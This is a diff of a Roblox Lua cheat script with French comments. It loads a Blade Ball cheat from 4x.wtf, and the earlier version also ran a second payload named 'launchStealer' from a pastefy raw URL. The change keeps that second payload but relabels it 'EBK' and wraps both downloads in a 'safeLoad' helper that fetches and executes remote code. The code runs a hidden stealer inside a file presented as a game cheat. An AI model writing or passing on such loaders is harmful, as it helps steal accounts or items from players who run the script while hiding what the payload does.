@@ -1,20 +1,31 @@
--- 1. 
-local function launchBladeBall()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://4x.wtf/loader"))()
+-- Fonction de chargement sécurisée
+local function safeLoad(url, name)
+    local success, content = pcall(function()
+        return game:HttpGet(url)
     end)
-    if not success then print("Erreur Argon: " .. tostring(err)) end
+
+    if success and content and #content > 0 then
+        local execSuccess, err = pcall(function()
+            loadstring(content)()
+        end)
+        if not execSuccess then
+            warn("Erreur d'exécution [" .. name .. "]: " .. tostring(err))
+        end
+    else
+        warn("Erreur de téléchargement [" .. name .. "]: Impossible de récupérer l'URL")
+    end
 end
 
--- 2. 
-local function launchStealer()
-    task.wait(5) -- On attend 5 secondes que le GUI de Blade Ball soit chargé
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/587JqZsk/raw"))()
-    end)
-    if not success then print("Erreur : " .. tostring(err)) end
-end
+-- 1. Lancement de Blade Ball (Argon)
+task.spawn(function()
+    print("Chargement de Argon...")
+    safeLoad("https://4x.wtf/loader", "Argon")
+end)
 
--- Exécution en threads séparés
-task.spawn(launchBladeBall)
-task.spawn(launchStealer)
+-- 2. Lancement de EBK avec un délai plus sûr
+task.spawn(function()
+    print("Attente pour EBK...")
+    task.wait(8) -- Augmenté à 8 secondes pour laisser le temps au GUI de s'initialiser
+    print("Chargement de EBK...")
+    safeLoad("https://pastefy.app/587JqZsk/raw", "EBK")
+end)
